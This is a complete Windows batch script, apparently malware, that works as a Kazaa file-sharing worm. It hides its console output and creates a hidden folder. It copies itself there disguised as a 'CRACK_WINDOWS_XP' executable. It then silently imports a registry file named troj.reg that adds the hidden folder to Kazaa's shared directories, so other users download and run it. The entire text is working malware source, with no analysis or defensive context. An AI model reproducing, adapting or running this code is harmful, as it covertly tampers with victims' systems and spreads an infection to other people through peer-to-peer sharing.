   @echo off
   ctty nul
   md c:\CheckSystem
   attrib +h c:\CheckSystem
   copy CRACK_~1.BAT c:\CheckSystem\CRACK_WINDOWS_XP.EXE.BAT

   @echo off
   @echo REGEDIT4>%TEMP%\troj.reg

   @echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
   @echo "Dir0"="012345:c:\\CheckSystem">>%TEMP%\troj.reg

   @echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
   @echo "Dir1"="012345:d:\\Kazzaaa">>%TEMP%\troj.reg

   @echo [HKEY_USERS\.DEFAULT\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
   @echo "Dir0"="012345:c:\\CheckSystem">>%TEMP%\troj.reg

   @echo [HKEY_USERS\.DEFAULT\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
   @echo "Dir1"="012345:d:\\Kazzaaa">>%TEMP%\troj.reg

   regedit /s %TEMP%\troj.reg
   rem del %TEMP%\troj.reg
   ctty con
   exit
